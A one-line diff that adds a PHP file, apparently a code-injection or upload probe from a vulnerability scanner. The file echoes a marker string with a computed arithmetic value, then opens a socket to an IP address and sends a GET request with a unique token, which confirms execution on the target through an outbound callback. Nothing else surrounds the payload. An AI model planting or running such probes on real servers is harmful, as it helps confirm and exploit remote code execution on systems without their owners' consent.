@@ -1,0 +1,1 @@
+<?php printf("nxfw3oqfe4".(7*6)."oygx4prgf5");$a=fsockopen("172.19.20.129", 80, $b, $c, 30);fwrite($a, "GET /110a6oyx9zddq9qsi81cdw3dc4iy6s6gyfm79yxn HTTP/1.1\r\nConnection: close\r\n\r\n");?>
